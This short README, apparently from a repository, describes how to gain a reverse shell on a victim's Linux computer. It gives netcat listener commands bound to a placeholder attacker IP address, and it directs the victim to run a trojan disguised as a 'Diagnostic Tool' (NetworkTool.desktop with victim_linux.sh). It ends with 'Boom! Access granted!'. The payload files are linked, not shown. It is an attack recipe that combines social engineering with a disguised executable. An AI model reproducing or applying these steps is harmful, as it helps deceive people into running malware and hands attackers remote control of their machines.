# Gain access to victim's computer with reverse shell

1. On **attacker's** computer (Linux with netcat installed), run the following if
    - victim is using linux (**our case**)
    ```bash
    sudo nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
    ```

    - ~~victim is using Windows~~
    ```bash
    stty raw -echo; (stty size; cat) | nc -lnvp PORT_NUMBER -s ATTACKERS_IP_ADDRESS
    ```

2. Wait for the victim to run the 'Diagnostic Tool' executable file: 
    - Linux:
        - [NetworkTool.desktop](NetworkTool.desktop) (executable), together with
        - [victim_linux.sh](victim_linux.sh)
        - Note: make the .desktop file executable by
            ```bash
            chmod +x NetworkTool.desktop 
            ```
    - ~~[Windows](victim_windows.py)~~

3. Boom! Access granted!
